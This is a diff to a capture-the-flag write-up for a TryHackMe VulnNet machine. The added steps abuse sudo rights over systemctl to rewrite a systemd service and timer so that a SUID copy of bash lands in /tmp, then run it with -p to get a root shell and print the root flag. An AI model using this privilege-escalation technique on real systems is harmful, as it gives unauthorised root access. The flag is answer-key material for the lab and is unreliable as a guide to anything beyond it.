@@ -276,6 +276,14 @@ serv-manage@vulnnet-node:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
 /usr/bin/sudo
 ```
 
+<br>
+
+```bash
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
+```
+
+<br>
+
 ```bash
 serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-job.service
 ```
@@ -288,14 +296,11 @@ Wants=vulnnet-auto.timer
 [Service]
 # Gather system statistics
 Type=forking
-ExecStart=/bin/bash -c "chmod +s /bin/bash"
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/bashroot;chmod +xs /tmp/bashroot'
 
 [Install]
-WantedBy=multi-user.target' > vulnnet-job.service
+WantedBy=multi-user.target
 ```
-
-![image](https://github.com/user-attachments/assets/234178d0-b74b-45e2-a66f-76cf2071beaa)
-
 
 ```bash
 serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-auto.timer
@@ -304,22 +309,20 @@ serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-auto.timer
 ```bash
 serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
 echo '[Unit]
-Description=Run VulnNet utilities every 30 min
+Description=Run VulnNet utilities every 1 min
 [Timer]
 OnBootSec=0min
-# 30 min job
+# 1 min job
 OnCalendar=*:0/1
 Unit=vulnnet-job.service
 [Install]
-WantedBy=basic.target' > vulnnet-auto.timer
+WantedBy=basic.target
 ```
 
 <br>
 
-![image](https://github.com/user-attachments/assets/c7080782-0564-4907-883d-6213957cacc8)
 
 ```bash
-serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
 serv-manage@vulnnet-node:~$ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$  sudo /bin/systemctl daemon-reload
 serv-manage@vulnnet-node:~$ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$   sudo /bin/systemctl start vulnnet-auto.timer
 ```
@@ -327,7 +330,9 @@ serv-manage@vulnnet-node:~$ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$   sudo
 <p> ... and after a while ...</p>
 
 ```bash
-....
+serv-manage@vulnnet-node:~$ /tmp/bashroot -p
+bashroot-4.4# cat /root/root.txt
+THM{abea728f211b105a608a720a37adabf9}
 ```
 
 
